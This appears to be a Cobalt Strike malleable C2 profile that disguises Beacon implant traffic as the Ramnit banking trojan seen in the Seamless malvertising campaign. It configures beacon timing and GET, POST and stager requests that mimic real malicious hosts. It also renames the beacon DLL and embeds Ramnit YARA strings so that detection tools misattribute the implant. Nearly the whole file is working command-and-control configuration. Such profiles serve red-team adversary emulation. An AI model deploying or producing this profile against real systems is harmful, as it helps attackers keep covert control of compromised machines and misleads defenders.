#ramnit trojan
#combines traffic seen from seamless campaign
#taken from --> https://malwarebreakdown.com/2018/01/16/rig-exploit-kit-delivers-ramnit-banking-trojan-via-seamless-malvertising-campaign/
#xx0hcd


set sleeptime "30000";
set jitter    "20";
set useragent "Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko)";
set dns_idle "8.8.8.8";
set maxdns    "235";


http-get {

    set uri "/redirect";
    
    client {

	header "Accept" "text/html, application/xhtml+xml, */*";
	header "Accept-Language" "en-US";	
	header "Accept-Encoding" "gzip, deflate";
	header "Host" "redirect.turself-josented.com";
        header "Connection" "Keep-Alive";
	
	
        
        metadata {
            netbios;
	    parameter "target";


        }


    }

    server {

        header "Server" "nginx";
	header "Content-Type" "text/html;charset=UTF-8";
	header "Connection" "keep-alive";
	header "Cache-Control" "no-store, no-cache, pre-check=0, post-check=0";
	header "Expires" "Thu, 01 Jan 1970 00:00:00 GMT";
	header "Pragma" "no-cache";
        

        output {
            base64;
	    prepend "105";
	    prepend "<html><head><link rel=\"icon\" type=\"image/gif\" href=\"data:image/gif;base64,";

	    append "\"/><meta http-equiv=\"refresh\" content=\"0;URL='http://xn-b1aanbboc3ad8jee4bff.xn--p1ai/gav4.php'\" /></head><body></body></html>";

	    print;
        }
    }
}

http-post {
    
    set uri "/Redirect.php";

    client {
       
	header "Accept" "*/*";
#	header "Content-Type" "application/x-www-form-urlencoded";
#	header "X-Requested-With" "XMLHttpRequest";
	header "Referer" "http://........../redirect.php?acsc=93042904";
	header "Accept-Language" "en-US";
	header "Host" "xn--b1aanbboc3ad8jee4bff.xn--p1ai";
#	header "Connection" "Keep-Alive";
        
        output {
            netbios;
	    print;

        }
        
  	     
        id {
            netbios;
	    prepend "http://........../redirect.php?acsc=";
	    header "Referer";

        }
    }

    server {

	header "Server" "nginx";
	header "Content-Type" "text/html, charset=UTF-8";
	header "Connection" "keep-alive";
	header "Vary" "Accept-Encoding";
	header "X-Powered-By" "PHP/5.6.30";
	header "Cache-Control" "no-store, no-cache, must-revalidate, max-age=0";
	header "Content-Encoding" "gzip";
        

        output {
            netbios;
            print;
        }
    }
}

http-stager {

	set uri_x86 "/Jump/next.php";
	set uri_x64 "/jump/Next.php";

    client {
	header "Accept" "text/html, application/xhtml+xml, */*";
	header "Referer" "http://buzzadnetwork.com/jump/next.php?r=1566861&sub1=";
	header "Accept-Language" "en-US";
	header "Accept-Encoding" "gzip, deflate";
	header "Host" "www.buzzadnetwork.com";
	header "Connection" "Keep-Alive";
    }

    server {
        header "Server" "openresty";
	header "Content-Type" "text/html; charset=utf-8";
	header "Keep-Alive" "timeout=2, max=100";
	header "Connection" "Keep-Alive";
	header "Location" "http://xn--b1aanbboc3ad8jee4bff.xn--p1ai/redirect.php?acsc=93042904";
	#has 2 r's in 'referrer'	
	header "Referrer-Policy" "no-referrer";
	header "Vary" "Accept-Encoding";
    
    }


}

stage {
	#https://www.symantec.com/content/dam/symantec/docs/security-center/white-papers/w32-ramnit-analysis-15-en.pdf
	set compile_time "09 Jan 2014 12:24:14";
	set userwx "false";
	set image_size_x86 "316224";
	set image_size_x64 "616224";

	transform-x86 {
		strrep "beacon.dll" "rmnsft.dll";
	}

	transform-x64 {
		strrep "beacon.x64.dll" "RMNSFT.dll";
	}	

	#https://github.com/tbarabosch/quincy-complementary-material/blob/master/yara/ramnit.yara
	stringw "USERPASSCWD CDUPQUITPORTPASVTYPEMODERETRSTORAPPERESTRNFRRNTOABORDELERMD";
	stringw "ModuleCode";
	stringw "StartRoutine";
	stringw "cookies.txt";

}
